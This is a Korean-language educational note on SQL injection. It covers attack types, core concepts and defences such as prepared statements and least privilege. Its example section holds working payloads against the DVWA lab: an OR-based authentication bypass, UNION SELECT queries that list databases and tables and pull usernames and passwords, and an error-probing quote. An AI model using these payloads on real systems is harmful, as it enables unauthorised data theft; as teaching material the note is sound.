# SQL Injection

## 개요

- SQL Injection은 사용자 입력값이 SQL Query에 직접 삽입되어 공격자가 의도하지 않은 DB 명령을 실행할 수 있는 취약점입니다.
- 서버는 변조된 Query를 그대로 DB에 전달하고, DB는 이를 정상적인 Query로 해석하여 실행합니다.
- OWASP Top 10 2025 기준 **A03: Injection**에 해당하며, 위험도가 높은 취약점입니다.

---

## 공격 유형

| 구분 | 설명 |
|------|------|
| Error-based | SQL 오류 메시지를 통해 DB 구조 및 데이터 추출 |
| UNION-based | UNION SELECT로 다른 테이블 데이터를 조회 |
| Boolean-based Blind | 참/거짓 응답 차이를 이용해 데이터를 추출 |
| Time-based Blind | 응답 지연 시간(`SLEEP`)으로 데이터를 추출 |
| Stacked Queries | 세미콜론(`;`)으로 여러 쿼리를 연속 실행 |

---

## 핵심 개념

- SQL Query에 사용자 입력값이 검증 없이 직접 포함될 때 발생합니다.
- 공격자는 SQL 문법을 이용해 WHERE 조건을 변경하거나 추가 쿼리를 삽입합니다.
- 작은따옴표(`'`)를 입력했을 때 SQL 문법 오류가 발생하면 취약점 존재 가능성이 높습니다.
- 에러 메시지 노출 여부에 따라 공격 방식이 달라집니다 (Error-based / Blind).

---

## 공격 방식 설명

공격자는 입력창에 SQL 특수문자(`'`, `;`, `--` 등)나 SQL 문법을 삽입하여 서버가 실행하는 Query의 구조를 변경합니다.  
서버는 변조된 Query를 그대로 DB에 전달하고, DB는 이를 정상적인 명령으로 해석하여 실행합니다.  
이 과정에서 인증 우회, 데이터 조회, 계정 탈취, 데이터 변조 등이 가능해집니다.

---

## 예시

### 인증 우회 (OR 조건 삽입)

```sql
-- 입력값
1' or '1'='1

-- 실제 실행되는 Query
SELECT first_name, last_name FROM users WHERE user_id = '1' or '1'='1';
-- '1'='1'은 항상 참 → WHERE 조건 전체가 참이 되어 모든 사용자 정보 반환
```

---

### UNION SELECT (정보 탈취)

```sql
-- 컬럼 개수 확인
1' UNION SELECT 1,2 #

-- DB 이름 조회
1' UNION SELECT schema_name,1 FROM information_schema.schemata #

-- 테이블 목록 조회
1' UNION SELECT table_name,1 FROM information_schema.tables WHERE table_schema='dvwa' #

-- 계정 정보 조회
1' UNION SELECT user,password FROM users #
```

---

### Error-based (에러 메시지 정보 노출)

```sql
-- 작은따옴표만 입력해도 SQL 오류 발생
'

-- 아래와 같은 에러 메시지가 노출되면 취약
-- You have an error in your SQL syntax near ''''' at line 1
```

---

## 특징

- 입력창 외에도 URL 파라미터, HTTP 헤더, 쿠키 등 다양한 경로로 공격이 가능합니다.
- DB 조회뿐 아니라 데이터 수정(UPDATE), 삭제(DELETE), 파일 읽기/쓰기까지 확장될 수 있습니다.
- 자동화 도구(sqlmap 등)를 이용하면 단시간에 전체 DB를 덤프할 수 있습니다.
- Blind SQL Injection은 에러 메시지가 없어도 응답 차이나 시간 차이로 데이터를 추출할 수 있습니다.

---

## 대응 방안

- Prepared Statement 사용 — Query와 입력값을 분리하여 SQL 문법으로 해석 차단
- 입력값 검증 — 숫자/문자 형식 및 길이 제한
- 특수문자 필터링 — `'`, `"`, `;`, `--`, `#` 등 차단
- 에러 메시지 외부 노출 차단 — 서버 로그에만 기록
- DB 계정 최소 권한 적용 — SELECT만 허용, 불필요한 권한 제거
- WAF(웹 방화벽) 적용 — SQL Injection 패턴 탐지 및 차단
